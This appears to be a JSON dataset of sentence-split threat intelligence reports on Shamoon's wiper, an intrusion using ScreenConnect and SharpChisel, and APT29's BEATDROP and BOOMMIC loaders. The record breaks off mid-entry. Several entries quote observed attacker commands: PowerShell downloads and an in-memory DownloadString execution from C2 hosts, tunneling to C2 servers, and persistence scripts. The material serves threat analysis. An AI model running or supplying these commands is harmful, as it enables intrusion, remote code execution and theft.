        "text": "- C$\\WINDOWS",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-961.md:::S26",
        "text": "- D$\\WINDOWS",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-961.md:::S27",
        "text": "- E$\\WINDOWS",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-961.md:::S28",
        "text": "Shamoon queries the service to retrieve specific information related to the LocalService account.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-961.md:::S29",
        "text": "It then retrieves the resources within the PE file to drop the components.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-961.md:::S30",
        "text": "Finding the location of the resource:",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-961.md:::S31",
        "text": "Shamoon creates the file and sets the time to August 2012 as an antiforensic trick.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-961.md:::S32",
        "text": "It puts this date on any file it can destroy.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-961.md:::S33",
        "text": "The modification time can be used as an antiforensic trick to bypass detection based on the timeline, for example.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-961.md:::S34",
        "text": "We also observed that in some cases the date is briefly modified on the system, faking the date of each file.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-961.md:::S35",
        "text": "The files dropped on the system are stored in C:\\\\Windows\\System32\\.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-961.md:::S36",
        "text": "Before creating the malicious service, Shamoon elevates its privilege by impersonating the token.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-961.md:::S37",
        "text": "It first uses LogonUser and ImpersonateLoggedOnUser, then ImpersonateNamedPipeClient.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-961.md:::S38",
        "text": "Metasploit uses a similar technique to elevate privileges.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-961.md:::S39",
        "text": "Elevating privileges is critical for malware to perform additional system modifications, which are usually restricted.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-961.md:::S40",
        "text": "Shamoon creates the new malicious service MaintenaceSrv.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-961.md:::S41",
        "text": "It creates the service with the option Autostart (StartType: 2) and runs the service with its own process (ServiceType: 0x10):",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-961.md:::S42",
        "text": "If the service is already created, it changes the configuration parameter of the service with the previous configuration.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-961.md:::S43",
        "text": "It finally finishes creating MaintenaceSrv:",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-961.md:::S44",
        "text": "The wiper dropped on the system can have any one of the following names:",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-961.md:::S45",
        "text": "Next the wiper runs to destroy the data.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-961.md:::S46",
        "text": "The wiper component is dropped into the System32 folder.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-961.md:::S47",
        "text": "It takes one parameter to run.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-961.md:::S48",
        "text": "The wiper driver is embedded in its resources.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-961.md:::S49",
        "text": "We can see the encrypted resources, 101, in this screenshot:\n",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-961.md:::S50",
        "text": "The resource decrypted is the driver ElRawDisk.sys, which wipes the disk.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-961.md:::S51",
        "text": "Extracting the resource:\n",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-961.md:::S52",
        "text": "This preceding file is not malicious but is considered risky because it is the original driver.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-961.md:::S53",
        "text": "The wiper creates a service to run the driver with the following command:\n",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-961.md:::S54",
        "text": "sc create hdv_725x type= kernel start= demand binpath= WINDOWS\\hdv_725x.sys 2>&1 >nul",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-961.md:::S55",
        "text": "The following screenshot shows the execution of this command:",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-961.md:::S56",
        "text": "The malware overwrites every file in c:\\Windows\\System32, placing the machine in a critical state.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-961.md:::S57",
        "text": "All the files on the system are overwritten.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-961.md:::S58",
        "text": "The overwriting process:",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-961.md:::S59",
        "text": "Finally, it forces the reboot with the following command:",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-961.md:::S60",
        "text": "Shutdown -r -f -t 2",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-961.md:::S61",
        "text": "Once the system is rebooted it shows a blue screen:",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-961.md:::S62",
        "text": "The worm component is extracted from the resources from the dropper.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-961.md:::S63",
        "text": "Destructive malware usually uses spreading techniques to infect machines as quickly as possible.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-961.md:::S64",
        "text": "The worm component can take the following names:",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-961.md:::S65",
        "text": "We noticed the capability to scan for the local network and connect to a potential control server:",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-961.md:::S66",
        "text": "Although the worm component can spread the dropper and connect to a remote server, the component was not used in this version.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-992.md:::S0",
        "text": "During our research, we observed a spearphishing email allegedly from a government agency.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-992.md:::S1",
        "text": "The email attempts to convince recipients to click the URL and download a malicious file.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-992.md:::S2",
        "text": "We have seen that one of two files may be downloaded, one being a .PDF file and the other an .RTF file.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-992.md:::S3",
        "text": "As with the spearphishing email, the lure documents' content attempts to convince the victim to click on another malicious URL and download a .ZIP file.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-992.md:::S4",
        "text": "The .ZIP file contains a copy of a legitimate remote administration software developed by RemoteUtilities and provides remote administration capabilities, including:\n",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-992.md:::S5",
        "text": "- Downloading and uploading files",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-992.md:::S6",
        "text": "- Grabbing screenshots\n",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-992.md:::S7",
        "text": "- Browsing files and directories",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-992.md:::S8",
        "text": "- Executing and terminating processes",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-992.md:::S9",
        "text": "During our research, we were able to discover multiple .ZIP files used to distribute the RemoteUtilities remote administration software in the manner above, with all of these distributing the same RemoteUtilities sample.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-992.md:::S10",
        "text": "The use of this tool differentiates this particular campaign from earlier research, as in previous attacks ScreenConnect was used.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-992.md:::S11",
        "text": "Otherwise, the TTPs in use remain broadly similar.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-992.md:::S12",
        "text": "When the RemoteUtilities software is executed, its process launches msiexec.exe with the following command:",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-992.md:::S13",
        "text": "The MSI installer installs a service on the victim machine called Remote Utilities \u2013 Host:",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-992.md:::S14",
        "text": "The service then communicates with the domain id.remoteutilities.com, which belongs to RemoteUtilities.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-992.md:::S15",
        "text": "This connection is related to one of its features called Internet-ID Connection.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-992.md:::S16",
        "text": "This feature allows an intermediary Internet server to broker the connection, similar to a proxy server.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-992.md:::S17",
        "text": "This allows the threat actor to connect to the Internet-ID server, which then connects to the actual RemoteUtilities host.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-992.md:::S18",
        "text": "During our research, we discovered a compromised host in Saudi Arabia that used ScreenConnect remote administration software.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-992.md:::S19",
        "text": "They were targeted via a malicious .ZIP file (SHA256 hash: b2f429efdb1801892ec8a2bcdd00a44d6ee31df04721482a1927fc6df554cdcf) that contained a ScreenConnect executable (SHA256 hash: 2f429efdb1801892ec8a2bcdd00a44d6ee31df04721482a1927fc6df554cdcf)\n",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-992.md:::S20",
        "text": "As noted above, the ScreenConnect executable connects to the Internet-ID server, which is located at instance-sy9at2-relay.screenconnect.com and resolves to 51.68.244.39.\n",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-992.md:::S21",
        "text": "The same domain was mentioned in the previous research.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-992.md:::S22",
        "text": "We then observed the threat actors interact with the compromised host using the ScreenConnect software, executing the following commands.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-992.md:::S23",
        "text": "cmd.exe net user /domain",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-992.md:::S24",
        "text": "The command above allows the attacker to get all the users from the domain controller.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-992.md:::S25",
        "text": "The next command executed is the following:\n",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-992.md:::S26",
        "text": "powershell.exe -exec bypass -w 1 -file a.ps1",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-992.md:::S27",
        "text": "This is a command to execute a PowerShell script of some kind.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-992.md:::S28",
        "text": "However, we did not have access to the a.ps1 file.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-992.md:::S29",
        "text": "We are not sure what functionality is provided here.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-992.md:::S30",
        "text": "The next command issued is the following:\n",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-992.md:::S31",
        "text": "powershell.exe iwr -uri http://87.236.212[.]184/SharpChisel.exe -outfile c:\\programdata\\SharpChisel.exe -usebasicparsing",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-992.md:::S32",
        "text": "The command is connected to 187.236.212[.]184 and downloads a file called SharpChisel.exe (SHA256: 61f83466b512eb12fc82441259a5205f076254546a7726a2e3e983011898e4e2) and saves the file to the C:\\programdata directory.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-992.md:::S33",
        "text": "The name SharpChisel may be related to the purpose of this file, which is a C# wrapper for a tunneling tool called chisel.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-992.md:::S34",
        "text": "The above IP address is geolocated to a server in Iran.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-992.md:::S35",
        "text": "The following command then configures SharpChisel:\n",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-992.md:::S36",
        "text": "C:\\programdata\\SharpChisel.exe client 87.236.212[.]184:8080 r:8888:127.0.0.1:9999",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-992.md:::S37",
        "text": "This directs all traffic to the localhost at port 9999 to the same remote server.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-992.md:::S38",
        "text": "Another instance of SharpChisel with different settings is executed, this time using PowerShell using the following command line:\n",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-992.md:::S39",
        "text": "powershell.exe C:\\programdata\\SharpChisel.exe client 87.236.212[.]184:443 R:8888:127.0.0.1:9999",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-992.md:::S40",
        "text": "This time, traffic will be forwarded to the server over port 443.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-992.md:::S41",
        "text": "A third SharpChisel instance that connects to a different C&C server at 23.95.215.100:8080 is started via the following command:\n",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-992.md:::S42",
        "text": "C:\\programdata\\SharpChisel.exe client 23.95.215[.]100:8080 r:8888:127.0.0.1:9999",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-992.md:::S43",
        "text": "It is then configured with the following command line PowerShell command:",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-992.md:::S44",
        "text": "powershell.exe C:\\programdata\\SharpChisel.exe client 23.95.215[.]100:8080 R:8888:127.0.0.1:9999",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-992.md:::S45",
        "text": "We believe that the threat actor was unable to configure SharpChisel to work correctly.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-992.md:::S46",
        "text": "The use of the following command provides additional evidence to support our assumption:",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-992.md:::S47",
        "text": "powershell.exe iwr -uri hxxp://87.236.212[.]184/procdump64.exe -outfile c:\\programdata\\procdump64.exe -usebasicparsing",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-992.md:::S48",
        "text": "The command connects to the C&C server, downloads procdump64.exe, and saves the file in the C:\\programdata directory.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-992.md:::S49",
        "text": "That supports our assumption that SharpChisel could not be configured correctly, and the attacker instead used PowerShell to download and run the legitimate procdump64.exe utility.\n",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-992.md:::S50",
        "text": "This was done using two separate commands:",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-992.md:::S51",
        "text": "- C:\\programdate\\1.exe -relayserver 87.236.212[.]184:5555",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-992.md:::S52",
        "text": "- C:\\users\\public\\new.exe -relayserver 87.236.212[.]184:5555",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-992.md:::S53",
        "text": "We then see the threat actor again attempting to use SharpChisel several times using the following command:",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-992.md:::S54",
        "text": "C:\\programdata\\SharpChisel.exe  client 87.236.212[.]184:8080 r:8888:127.0.0.1:9999",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-992.md:::S55",
        "text": "powershell.exe C:\\programdata\\SharpChisel.exe client 87.236.212[.]184:8080 R:8888:127.0.0.1:9999",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-992.md:::S56",
        "text": "We conclude that a tunneling connection to the C&C server could not be established, even after attempts to do so with two different tools.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-992.md:::S57",
        "text": "Following the unsuccessful attempt to configure a tunnel connection to their C&C server, the threat actors downloaded a remote access tool (RAT) and attempted to configure it.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-992.md:::S58",
        "text": "The following PowerShell command was used for this:",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-992.md:::S59",
        "text": "powershell.exe iwr -uri hxxp://87.236.212[.]184/out1 -outfile c:\\users\\public\\out1.exe -usebasicparsing",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-992.md:::S60",
        "text": "The command downloads out1.exe and saves the file in the C:\\users\\public\\ directory.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-992.md:::S61",
        "text": "Using a UPX unpacker, we were able to extract the contents, which consists of a Python executable.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-992.md:::S62",
        "text": "We then decompiled the python executable using pyinstxtractor.py to get all of the Python bytecode files.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-992.md:::S63",
        "text": "These are then decompiled to get the original python code using easypythondecompiler.\n",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-992.md:::S64",
        "text": "The out1.exe RAT has the following capabilities:\n",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-992.md:::S65",
        "text": "- Data encoding",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-992.md:::S66",
        "text": "- Email parsing",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-992.md:::S67",
        "text": "- File and registry copy",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-992.md:::S68",
        "text": "- HTTP/S connection support",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-992.md:::S69",
        "text": "- Native command line",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-992.md:::S70",
        "text": "- Process and file execution",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-992.md:::S71",
        "text": "After this, the file C:\\users\\public\\Browser64.exe is run.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-992.md:::S72",
        "text": "Browser64 is a tool that extracts credentials from the following applications:\n",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-992.md:::S73",
        "text": "- Chrome\n",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-992.md:::S74",
        "text": "- Chromium",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-992.md:::S75",
        "text": "- Firefox\n",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-992.md:::S76",
        "text": "- Opera\n",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-992.md:::S77",
        "text": "- Internet Explorer\n",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-992.md:::S78",
        "text": "- Outlook",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-992.md:::S79",
        "text": "Following the use of browser64.exe, we observed the following command being executed:\n",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-992.md:::S80",
        "text": "powershell.exe iex(new-object System.Net.WebClient).DownloadString('hxxp://23.94.50[.]197:444/index.jsp/deb2b1a127c472229babbb8dc2dca1c2/QPKb49mivezAdai1')",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-992.md:::S81",
        "text": "They again attempted to use SharpChisel with no success:",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-992.md:::S82",
        "text": "- powershell.exe C:\\programdata\\SharpChisel.exe client 23.95.215[.]100:443 R:8888:127.0.0.1:9999",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-992.md:::S83",
        "text": "- C:\\programdata\\SharpChisel.exe client 23.95.215[.]100:443 R:8888:127.0.0.1:9999",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-992.md:::S84",
        "text": "- C:\\programdata\\SharpChisel.exe server -p 9999 --socks5",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-992.md:::S85",
        "text": "Finally, we observed a persistence mechanism being set using the following commands:",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-992.md:::S86",
        "text": "- cmd.exe /c Wscript.exe \"C:\\Users\\[REDACTED]\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\news.js\"",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-992.md:::S87",
        "text": "- cmd.exe /c \"C:\\Users\\[REDACTED]\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\newsblog.js\"",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-992.md:::S88",
        "text": "We were able to get a copy of newsblog.js, which is a simple VBS downloader that communicates with the following URL: hxxp://23[.]95[.]215[.]100:8008/index.jsp/7e95a3d753cc4a17793ef9513e030b49/4t2Fg7k6wWRnKgd9",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-992.md:::S89",
        "text": "The script sets up a new HTTP object and then tries to disable the system's local proxy settings.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-992.md:::S90",
        "text": "The script then executes an HTTP GET request to the C&C URL, grabs the server's response, and sleeps for 10 seconds.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-992.md:::S91",
        "text": "At the time of our analysis, this server was still available.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-992.md:::S92",
        "text": "The response from the server contains an encoded PowerShell script, which is executed in memory.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-992.md:::S93",
        "text": "Decoding this script reveals that it contains a backdoor:\n",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-992.md:::S94",
        "text": "The screenshot above shows an abbreviated view of the in-memory PowerShell backdoor.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-992.md:::S95",
        "text": "The PowerShell backdoor has the following capabilities.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-992.md:::S96",
        "text": "- Check for Skype connectivity\n",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-992.md:::S97",
        "text": "- Download and install Skype",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-992.md:::S98",
        "text": "- Encoded communication with its C2",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-992.md:::S99",
        "text": "- Execute commands sent from the C2 server\n",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-992.md:::S100",
        "text": "- Get multifactor authentication settings",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-992.md:::S101",
        "text": "- Get the currently logged on user and OS version\n",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-1011.md:::S0",
        "text": "To gain access to a victim environment, APT29 sent spear-phishing emails disguised as embassy administrative updates.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-1011.md:::S1",
        "text": "These phishing emails used legitimate, but compromised email addresses from other diplomatic entities.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-1011.md:::S2",
        "text": "APT29 targeted large lists of recipients that Mandiant suspected were primarily publicly listed points of contact of embassy personnel.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-1011.md:::S3",
        "text": "These phishing emails utilized a malicious HTML dropper tracked as ROOTSAW, that makes use of a technique known as HTML smuggling to deliver an IMG or ISO file to a victim system.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-1011.md:::S4",
        "text": "When opened, the ROOTSAW HTML dropper will write an IMG or ISO file to disk.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-1011.md:::S5",
        "text": "On Windows 10 or later, the image file is mounted when double-clicked and the user is presented with the image file as the folder contents in Windows Explorer.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-1011.md:::S6",
        "text": "The image file contains two additional files, a Windows shortcut (LNK) file and a malicious DLL.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-1011.md:::S7",
        "text": "If the user clicks the LNK file, the \u201cTarget\u201d command will execute as normal.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-1011.md:::S8",
        "text": "This mechanism lures the victim into opening the LNK file and thus inadvertently launches the malicious DLL.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-1011.md:::S9",
        "text": "Files contained within image files, like mounted ISO files, will not contain the Zone.Identifier Alternate Data Stream (ADS) flag that indicates the files have been downloaded from the internet (so called \u201cmark-of-the-web\u201d) as reported by Didier Stevens.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-1011.md:::S10",
        "text": "This prevents a Windows operating system warning message for files opened from ISO or IMG image files.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-1011.md:::S11",
        "text": "The LNK utilized by APT29 in the early waves of this campaign shared multiple characteristics with those identified in campaigns from 2021, including the use of a specific icon location, as well as the machine ID and MAC address.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-1011.md:::S12",
        "text": "One technique observed being used by APT29 was using LNK file extensions that have a different icon than the target application or document, making the shortcut appear as a document rather than a program to launch.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-1011.md:::S13",
        "text": "This tricks the victim into opening a seemingly legitimate document.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-1011.md:::S14",
        "text": "Shortcut files by default also have their LNK file extension hidden, even if the Windows Explorer \u201cshow file extensions\u201d is enabled, further lowering any suspicion a shortcut instead of a document is opened.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-1011.md:::S15",
        "text": "The \u201cTarget\u201d in the LNK will execute the DLL with rundll32.exe and one of the DLL\u2019s exports:",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-1011.md:::S16",
        "text": "Mandiant also identified APT29 utilizing a malicious docx to deliver an HTA dropper, resulting in the delivery and execution of BEATDROP on a target system, in a separate but similar phishing campaign.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-1011.md:::S17",
        "text": "BEATDROP is a downloader written in C that makes use of Trello for C2.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-1011.md:::S18",
        "text": "Once executed, BEATDROP first maps its own copy of `ntdll.dll` into memory for the purpose of executing shellcode in its own process.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-1011.md:::S19",
        "text": "BEATDROP first creates a suspended thread with RtlCreateUserThread which points to NtCreateFile .",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-1011.md:::S20",
        "text": "Following this, BEATDROP will enumerate the system for the username, computer name, and IP address.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-1011.md:::S21",
        "text": "This information is used to create a victim ID, which is used by BEATDROP to store and retrieve victim payloads from its C2.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-1011.md:::S22",
        "text": "Once the victim ID is created, BEATDROP will make an initial request to Trello to identify whether the current victim has already been compromised.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-1011.md:::S23",
        "text": "The process to identify whether the victim is already compromised begins with a GET request to retrieve the user ID from the following URL:\n",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-1011.md:::S24",
        "text": "BEATDROP then uses the user ID received from the URL in Figure 9 to list the boards related to the user, which contain all current victims.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-1011.md:::S25",
        "text": "BEATDROP enumerates the victim boards to identify if the current target exists in the database or not.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-1011.md:::S26",
        "text": "If the current victim does not, BEATDROP crafts a POST request to add the victim to the database using the data enumerated from the host.\n",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-1011.md:::S27",
        "text": "Once the victim is either identified or added to the database, BEATDROP will send a request to gather the victim board for the current target:\n",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-1011.md:::S28",
        "text": "BEATDROP will then enumerate the response to determine if a payload exists for the current victim.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-1011.md:::S29",
        "text": "If one does, BEATDROP will then send a request to determine the URL to retrieve the final payload.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-1011.md:::S30",
        "text": "The final URL will deliver the payload AES encrypted as its response.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-1011.md:::S31",
        "text": "For most of the aforementioned requests to the Trello API the key and token inserted as URL parameters is enough to retrieve the information from the Trello API.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-1011.md:::S32",
        "text": "In the case of using the download API however, Trello requires the use of a header which is also embedded in the BEATDROP samples:",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-1011.md:::S33",
        "text": "Analysis of early BEATDROP samples identified the malware utilized an interesting User Agent when communicating with its C2.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-1011.md:::S34",
        "text": "The initial User Agent string was related to Apple iPads, however Mandiant observed a shift in TTPs in later BEATDROP samples to utilizing more commonly observed Windows User Agent strings.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-1011.md:::S35",
        "text": "BEATDROP is an ideal example of APT29\u2019s continued efforts to obfuscate its activity and maintain persistent access.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-1011.md:::S36",
        "text": "Following multiple waves of phishing utilizing BEATDROP to target diplomatic entities, Mandiant along with other researchers identified APT29 moving away from BEATDROP to a novel C++ BEACON loader in their latest campaigns against diplomatic entities.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-1011.md:::S37",
        "text": "Several scenarios could explain this shift in tooling including the possibility that BEATDROP was no longer providing value to the group in terms of capability, or reflective of operational TTPs to periodically retool for the purposes of evading detection.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-1011.md:::S38",
        "text": "Following the successful deployment of BEATDROP to deliver and execute a payload, APT29 was observed leveraging BOOMMIC to further establish a foothold within the environment.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-1011.md:::S39",
        "text": "BOOMMIC, also known as VaporRage by Microsoft, is a shellcode downloader written in C that communicates over HTTP to co-opted infrastructure used for C2.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-1011.md:::S40",
        "text": "APT29 executed BOOMMIC through DLL Side Loading of a modified version.dll by a legitimate Java binary, jucheck.exe.\n",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-1011.md:::S41",
        "text": "APT29 first deployed BOOMMIC within minutes following the successful execution of BEATDROP.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-1011.md:::S42",
        "text": "The group deployed the malicious BOOMMIC DLL javafx_font.dll (363a95777f401df40db61148593ea387) alongside two additional files:\n",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-1011.md:::S43",
        "text": "- jucheck.exe (da24b2783758ff5ccc2d0f5ebcc2a218)",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-1011.md:::S44",
        "text": "- version.dll (8bb3d91b666813372e66903209bd45fd)",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-1011.md:::S45",
        "text": "Prior to executing BOOMMIC APT29 was observed creating persistence via a registry key for \u201cJava Update\u201d that would execute jucheck.exe from the directory that contained version.dll and the BOOMMIC payload.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-1011.md:::S46",
